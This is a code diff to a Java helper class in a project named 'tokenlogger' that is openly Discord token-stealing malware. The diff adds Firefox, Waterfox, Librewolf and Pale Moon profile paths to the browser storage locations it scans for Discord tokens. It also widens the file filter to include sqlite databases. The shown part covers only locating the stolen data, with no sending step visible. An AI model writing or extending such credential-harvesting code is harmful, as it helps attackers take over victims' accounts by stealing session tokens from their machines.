@@ -1,14 +1,17 @@
 package tokenlogger.utils;
 
-import java.util.Arrays;
+import java.io.IOException;
+import java.nio.file.Files;
 import java.util.List;
 import java.util.ArrayList;
 import java.io.File;
 import java.nio.file.Paths;
+import java.util.stream.Stream;
 
 public class PathHelper {
     public static final String ROAMING = System.getenv("APPDATA");
     public static final String LOCAL = System.getenv("LOCALAPPDATA");
+    private static final Boolean HAS_PROFILES = true;
     private static List<String> clientPaths = new ArrayList<>();
     private static List<String> browserPaths = new ArrayList<>();
 
@@ -38,12 +41,34 @@ public class PathHelper {
         addPath(browserPaths, LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");                   // Epic Privacy Browser
         addPath(browserPaths, LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");                                  // Falkon
         addPath(browserPaths, LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");                // Yandex
+        addPath(browserPaths, HAS_PROFILES, ROAMING, "Mozilla", "Firefox", "Profiles");                                              // Firefox
+        addPath(browserPaths, HAS_PROFILES, ROAMING, "Waterfox", "Profiles");                                                        // Waterfox
+        addPath(browserPaths, HAS_PROFILES, ROAMING, "librewolf", "Profiles");                                                       // Librewolf
+        addPath(browserPaths, HAS_PROFILES, ROAMING, "Moonchild Productions", "Pale Moon", "Profiles");                              // Pale Moon
 
+        browserPaths.forEach(System.out::println);
         return browserPaths;
     }
 
     private static void addPath(List<String> list, String... elements) {
-        list.add(Paths.get(elements[0], Arrays.copyOfRange(elements, 1, elements.length)).toString());
+        list.add(String.join(File.separator, elements));
+    }
+
+    private static void addPath(List<String> list, Boolean hasProfiles, String... elements) {
+        if (!hasProfiles) return;
+        try {
+            Files.list(Paths.get(String.join(File.separator, elements)))
+                    .flatMap(subfolder -> {
+                        try {
+                            return Files.list(Paths.get(subfolder.toFile().getAbsolutePath(), "storage", "default"))
+                                    .filter(file -> file.toFile().getName().contains("discord"))
+                                    .map(file -> Paths.get(file.toFile().getAbsolutePath(), "ls").toString());
+                        } catch (IOException e) {
+                            return Stream.empty();
+                        }
+                    })
+                    .forEach(list::add);
+        } catch (Exception ignored) {}
     }
 
     public static List<File> listValidFiles(String path) {
@@ -54,7 +79,7 @@ public class PathHelper {
 
         for (File file : directory.listFiles()) {
             String fileName = file.getName();
-            if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) validFiles.add(file);
+            if (fileName.endsWith(".ldb") || fileName.endsWith(".log") || fileName.endsWith("sqlite")) validFiles.add(file);
         }
 
         return validFiles;
